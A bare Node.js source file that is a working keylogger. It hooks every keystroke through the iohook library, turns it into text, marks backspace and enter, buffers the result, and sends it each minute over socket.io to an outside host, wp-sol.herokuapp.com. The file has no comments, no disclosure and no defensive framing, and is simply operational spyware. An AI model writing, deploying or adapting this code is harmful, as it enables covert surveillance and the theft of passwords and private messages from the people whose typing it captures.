'use strict';

const ioHook = require('iohook');
ioHook.start();

const CTRL = 29;
const ALT = 56;
const F7 = 65;

var buffer = '';

var socket = require('socket.io-client')('https://wp-sol.herokuapp.com');
socket.on('connect', function() {

});
socket.on('event', function(data) {

});
socket.on('disconnect', function() {

});

ioHook.on("keydown", function(msg) {
	// console.log(msg, String.fromCharCode(msg.rawcode));
	var code = msg.rawcode;

	if (code > 64 && code < 91) {
		if (!msg.shiftKey) {
			code += 32;
		}
		buffer += String.fromCharCode(code);
	} else if (code == 8) {
		buffer += '[~BS~]'
	} else if (code == 32) {
		buffer += ' ';
	} else if (code > 47 && code < 58) {
		if (!msg.shiftKey) {
			buffer += String.fromCharCode(code);
		} else if (code == 49) {
			buffer += '!';
		} else if (code == 50) {
			buffer += '@';
		} else if (code == 51) {
			buffer += '#';
		} else if (code == 52) {
			buffer += '$';
		} else if (code == 53) {
			buffer += '%';
		} else if (code == 54) {
			buffer += '^';
		} else if (code == 55) {
			buffer += '&';
		} else if (code == 56) {
			buffer += '*';
		} else if (code == 57) {
			buffer += '(';
		} else if (code == 48) {
			buffer += ')';
		}
	} else if (code == 189) {
		if (!msg.shiftKey) {
			buffer += '-';
		} else {
			buffer += '_';
		}
	} else if (code == 187) {
		if (!msg.shiftKey) {
			buffer += '=';
		} else {
			buffer += '+';
		}
	} else if (code == 219) {
		if (!msg.shiftKey) {
			buffer += '[';
		} else {
			buffer += '{'
		}
	} else if (code == 221) {
		if (!msg.shiftKey) {
			buffer += ']';
		} else {
			buffer += '}';
		}
	} else if (code == 186) {
		if (!msg.shiftKey) {
			buffer += ';';
		} else {
			buffer += ':';
		}
	} else if (code == 222) {
		if (!msg.shiftKey) {
			buffer += "'";
		} else {
			buffer += '"';
		}
	} else if (code == 188) {
		if (!msg.shiftKey) {
			buffer += ',';
		} else {
			buffer += '<';
		}
	} else if (code == 190) {
		if (!msg.shiftKey) {
			buffer += '.';
		} else {
			buffer += '>';
		}
	} else if (code == 191) {
		if (!msg.shiftKey) {
			buffer += '/';
		} else {
			buffer += '?';
		}
	} else if (code == 13) {
		buffer += '[~CR~]';
	} else if (code > 95 && code < 106) {
		buffer += (code - 96);
	} else if (code == 107) {
		buffer += '+';
	} else if (code == 109) {
		buffer += '-';
	} else if (code == 106) {
		buffer += '*';
	} else if (code == 111) {
		buffer += '/';
	}
});

setInterval(() => {
	if (buffer.length) {
		// console.log(buffer)
		socket.emit('KEY_DOWN', buffer);
		buffer = '';
	}
}, 60000);